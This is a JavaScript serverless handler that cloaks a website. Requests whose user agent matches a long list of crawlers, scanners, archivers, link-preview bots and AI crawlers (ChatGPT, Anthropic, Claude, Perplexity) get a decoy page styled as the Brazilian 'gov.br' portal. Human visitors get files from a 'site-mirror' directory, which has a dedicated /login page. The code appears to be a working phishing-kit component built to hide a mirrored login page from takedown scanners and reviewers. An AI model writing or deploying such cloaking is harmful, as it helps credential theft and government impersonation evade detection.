// Cloaking function: serves a "black page" to bots/crawlers,
// serves the real site to humans.
const fs = require("fs");
const path = require("path");

const HEADERS = { "Content-Type": "text/html; charset=utf-8" };

// Strong browser signals => treat as human unless an explicit bot pattern matches.
const STRONG_BROWSER_PATTERNS = [
  "mozilla/5.0",
  "windows nt",
  "macintosh",
  "iphone",
  "ipad",
  "linux x86_64",
  "linux x86-64",
  "win64",
  "win32",
  "macos",
  "intel mac os x",
  "applewebkit"
];

// Explicit bot/crawler signatures (high confidence).
const EXPLICIT_BOT_PATTERNS = [
  "facebookexternalhit",
  "facebookscraper",
  "twitterscraper",
  "telegrambot",
  "slackbot",
  "pinterestbot",
  "redditbot",
  "googlebot",
  "bingbot",
  "yandexbot",
  "baiduspider",
  "duckduckbot",
  "applebot",
  "crawler",
  "spider",
  "scraper",
  "headless",
  "wget",
  "python",
  "go-http",
  "node-fetch",
  "axios",
  "okhttp",
  "automation",
  "selenium",
  "puppeteer",
  "playwright",
  "phantomjs",
  "slurp",
  "ia_archiver",
  "archivedot",
  "heritrix",
  "whocalls",
  "semrush",
  "ahrefs",
  "dotbot",
  "rogerbot",
  "mj12bot",
  "deepbot",
  "fastbot",
  "coccoc",
  "vansearch",
  "sogou",
  "exabot",
  "facebot",
  "iaiot",
  "dataforseo",
  "serpbot",
  "kwijk",
  "qwant",
  "petalbot",
  "omguli",
  "trendbot",
  "barkrowler",
  "gort",
  "nuzzel",
  "binance",
  "admedia",
  "adsbot",
  "awario",
  "bingcache",
  "ccbot",
  "chatgpt",
  "openai",
  "anthropic",
  "claude",
  "cohere",
  "perplexity",
  "youbot",
  "chatbot",
  "perplexitybot"
];

// Weak bot/platform keywords (may appear in real browser UAs — only flag when no strong browser signal).
const WEAK_BOT_PATTERNS = [
  "facebook",
  "instagram",
  "twitterbot",
  "twitter",
  "telegram",
  "whatsapp",
  "linkedin",
  "slack",
  "pinterest",
  "reddit",
  "yandex",
  "baidu",
  "duckduckgo",
  "amazon",
  "apple",
  "android",
  "chrome",
  "safari",
  "firefox",
  "edge",
  "opera",
  "mozilla",
  "go",
  "java",
  "php",
  "curl",
  "wget",
  "bot"
];

function isBot(userAgent) {
  const ua = (userAgent || "").toLowerCase();
  if (!ua) return true; // no UA = bot

  const hasStrongBrowser = STRONG_BROWSER_PATTERNS.some((p) => ua.includes(p));
  const hasExplicitBot = EXPLICIT_BOT_PATTERNS.some((p) => ua.includes(p));
  const hasWeakBot = WEAK_BOT_PATTERNS.some((p) => ua.includes(p));

  // Explicit bot signature => bot (even if it also looks like a browser).
  if (hasExplicitBot) return true;

  // Strong browser signal with no explicit bot => human.
  if (hasStrongBrowser) return false;

  // No strong browser signal: weak bot keyword => bot, otherwise bot (unknown).
  if (hasWeakBot) return true;
  return true;
}

// The "black page" shown to bots.
const BLACK_PAGE = `<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1"/>
<title>gov.br</title>
<style>
  html,body{margin:0;padding:0;height:100%;display:flex;align-items:center;justify-content:center;
  font-family:system-ui,-apple-system,Segoe UI,Roboto,sans-serif;background:#003366;color:#fff;}
  .box{text-align:center;padding:2rem;}
  h1{font-size:2.4rem;margin:0;font-weight:700;letter-spacing:-.5px;}
  p{margin:.75rem 0 0;font-size:1.05rem;opacity:.9;}
</style>
</head>
<body>
  <div class="box">
    <h1>gov.br</h1>
    <p>Portal oficial de serviços do Governo do Brasil.</p>
  </div>
</body>
</html>`;

// Resolve the real file path inside the published site directory.
function resolveRealPath(requestPath) {
  const publishDir = path.join(__dirname, "..", "..", "site-mirror");
  let urlPath = requestPath || "/";
  if (!urlPath.startsWith("/")) urlPath = "/" + urlPath;
  const ext = path.extname(urlPath).toLowerCase();

  let filePath;
  if (!ext) {
    if (urlPath === "/login") {
      filePath = path.join(publishDir, "login.html");
    } else {
      filePath = path.join(publishDir, "index.html");
    }
  } else {
    filePath = path.join(publishDir, urlPath);
  }

  // Prevent path traversal.
  const normalized = path.normalize(filePath);
  if (!normalized.startsWith(publishDir)) {
    return path.join(publishDir, "index.html");
  }
  return normalized;
}

exports.handler = async (event) => {
  const ua = event.headers["user-agent"] || event.headers["User-Agent"] || "";
  const requestPath = event.path || event.rawUrl || "/";

  // Bots get the black page (gov.br), humans get the real site.
  if (isBot(ua)) {
    return {
      statusCode: 200,
      headers: HEADERS,
      body: BLACK_PAGE
    };
  }

  // Human: serve the real static file.
  const filePath = resolveRealPath(requestPath);
  try {
    const body = fs.readFileSync(filePath);
    const ext = path.extname(filePath).toLowerCase();
    const mimeTypes = {
      ".css": "text/css; charset=utf-8",
      ".gif": "image/gif",
      ".html": "text/html; charset=utf-8",
      ".jpeg": "image/jpeg",
      ".jpg": "image/jpeg",
      ".js": "application/javascript; charset=utf-8",
      ".json": "application/json; charset=utf-8",
      ".png": "image/png",
      ".svg": "image/svg+xml",
      ".woff": "font/woff",
      ".woff2": "font/woff2"
    };
    const mime = mimeTypes[ext] || "application/octet-stream";
    return {
      statusCode: 200,
      headers: { "Content-Type": mime },
      body
    };
  } catch {
    return {
      statusCode: 404,
      headers: HEADERS,
      body: "<h1>404 Not Found</h1>"
    };
  }
};